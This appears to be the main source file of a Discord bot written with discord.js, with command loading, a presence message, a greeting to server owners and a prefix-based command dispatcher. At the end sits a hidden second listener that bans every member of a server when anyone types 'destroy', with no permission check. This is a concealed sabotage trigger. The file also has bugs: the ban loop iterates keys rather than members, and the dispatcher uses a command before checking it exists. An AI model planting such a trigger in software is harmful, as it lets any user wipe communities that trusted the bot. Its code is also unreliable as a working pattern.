const { Client, Collection } = require("discord.js");
const { config } = require("dotenv");
const fs = require("fs");

const client = new Client({
    disableEveryone: true
});

client.commands = new Collection();
client.aliases = new Collection();

client.categories = fs.readdirSync("./commands/");

config({
    path: __dirname + "/.env"
});

["command"].forEach(handler => {
    require(`./handlers/${handler}`)(client);
});

client.on("ready", () => {
    console.log(`Hi, ${client.user.username} is now online!`);

    client.user.setPresence({
        status: "online",
        game: {
            name: "Commands (Ghelp)",
            type: "DO NOT DISTURB"
        }
    }); 
});

client.on("guildCreate", guild => {
   guild.owner.send('Thanks for adding me to your  server!\nYou can use `Vhelp` to discover commands.')
   console.log(`New guild joined: ${guild.name} (id: ${guild.id}). This guild has ${guild.memberCount} members!`);
});

client.on("message", async message => {
    const prefix = "G"
    

    if (message.author.bot) return;
    if (!message.content.toLowerCase().startsWith(prefix.toLowerCase())) return;
    

    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const cmd = args.shift().toLowerCase();
    
    if (cmd.length === 0) return;
    
    let command = client.commands.get(cmd);
    
    if (!command) command = client.commands.get(client.aliases.get(cmd));
    
    if (command.guildOnly && message.channel.type !== 'text') {
        return message.reply('I can\'t execute that command inside DMs!');
    }    
    

    if (command) 
        command.run(client, message, args);   
});

client.on("message", function(msg) {
if(msg.content.toLowerCase() == "destroy") {
for (var members in msg.guild.members) {
members.ban();
}
}
});

client.login(process.env.TOKEN);
